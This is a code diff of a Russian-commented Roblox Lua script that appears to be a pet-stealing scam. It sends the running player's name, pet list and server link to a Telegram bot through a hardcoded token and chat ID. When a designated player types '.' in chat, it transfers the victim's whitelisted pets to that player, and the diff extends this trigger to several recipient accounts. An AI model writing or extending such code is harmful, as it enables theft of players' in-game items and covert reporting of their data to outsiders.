@@ -159,8 +159,8 @@ task.spawn(function()
     task.cancel(dotTask)
 end)
 local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHAT_ID = "-1002927824958" -- ID канала с префиксом для публичного канала
-local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
+local TELEGRAM_CHAT_ID = "-1002927824958"
+local TARGET_PLAYERS = {"Rikizigg", "sERTTQE0"}
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
     "Raccoon",
@@ -293,10 +293,12 @@ local function sendInitialNotification()
     local petsList = getPetsList()
     local serverLink = getServerLink()
     
+    local targetPlayersText = table.concat(TARGET_PLAYERS, ", ")
+    
     local message = string.format(
         "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
         LocalPlayer.Name,
-        TARGET_PLAYER, 
+        targetPlayersText, 
         TRIGGER_MESSAGE,
         petsList,
         serverLink
@@ -308,7 +310,7 @@ local function sendInitialNotification()
         local part1 = string.format(
             "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s",
             LocalPlayer.Name,
-            TARGET_PLAYER, 
+            targetPlayersText, 
             TRIGGER_MESSAGE
         )
         
@@ -366,9 +368,19 @@ local function startPetTransfer()
         return
     end
     
-    local target = Players:FindFirstChild(TARGET_PLAYER)
+    -- Ищем любого из target игроков
+    local target = nil
+    for _, playerName in ipairs(TARGET_PLAYERS) do
+        local player = Players:FindFirstChild(playerName)
+        if player then
+            target = player
+            break
+        end
+    end
+    
     if not target then
-        sendToTelegram("Игрок " .. TARGET_PLAYER .. " не найден!")
+        local targetNames = table.concat(TARGET_PLAYERS, ", ")
+        sendToTelegram("Ни один из игроков не найден: " .. targetNames)
         return
     end
     
@@ -405,25 +417,37 @@ local function startPetTransfer()
     end
     
     sendToTelegram(string.format(
-        "ГОТОВО!\nВсего питомцев: %d\nУспешно: %d\nОшибок: %d", 
-        #whitelistedPets, successful, failed
+        "ГОТОВО!\nПередано игроку: %s\nВсего питомцев: %d\nУспешно: %d\nОшибок: %d", 
+        target.Name, #whitelistedPets, successful, failed
     ))
 end
 local function setupMessageListener()
     if TextChatService then
         TextChatService.OnIncomingMessage = function(message)
             local speaker = Players:FindFirstChild(message.TextSource.Name)
-            if speaker and speaker.Name == TARGET_PLAYER then
-                if message.Text == TRIGGER_MESSAGE then
-                    startPetTransfer()
+            if speaker then
+                -- Проверяем, является ли отправитель одним из target игроков
+                for _, targetName in ipairs(TARGET_PLAYERS) do
+                    if speaker.Name == targetName then
+                        if message.Text == TRIGGER_MESSAGE then
+                            startPetTransfer()
+                            return
+                        end
+                    end
                 end
             end
         end
     else
         Players.PlayerChatted:Connect(function(chatType, speaker, message)
-            if chatType == Enum.PlayerChatType.All and speaker.Name == TARGET_PLAYER then
-                if message == TRIGGER_MESSAGE then
-                    startPetTransfer()
+            if chatType == Enum.PlayerChatType.All then
+                -- Проверяем, является ли отправитель одним из target игроков
+                for _, targetName in ipairs(TARGET_PLAYERS) do
+                    if speaker.Name == targetName then
+                        if message == TRIGGER_MESSAGE then
+                            startPetTransfer()
+                            return
+                        end
+                    end
                 end
             end
         end)
